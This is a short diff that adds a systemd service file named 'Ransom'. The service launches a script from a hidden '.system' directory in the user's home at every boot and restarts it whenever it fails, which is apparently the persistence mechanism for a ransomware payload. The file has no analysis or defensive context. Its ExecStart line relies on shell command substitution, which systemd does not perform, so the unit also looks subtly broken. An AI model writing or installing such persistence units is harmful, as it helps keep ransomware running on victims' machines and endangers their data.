@@ -1,0 +1,9 @@
+[Unit]
+Description = Ransom
+[Service]
+ExecStart=/bin/bash /home/$(whoami)/.system/drans -no-browser
+Restart=on-failure
+SuccessExitStatus=3 4
+RestartForceExitStatus=3 4
+[Install]
+WantedBy=multi-user.target
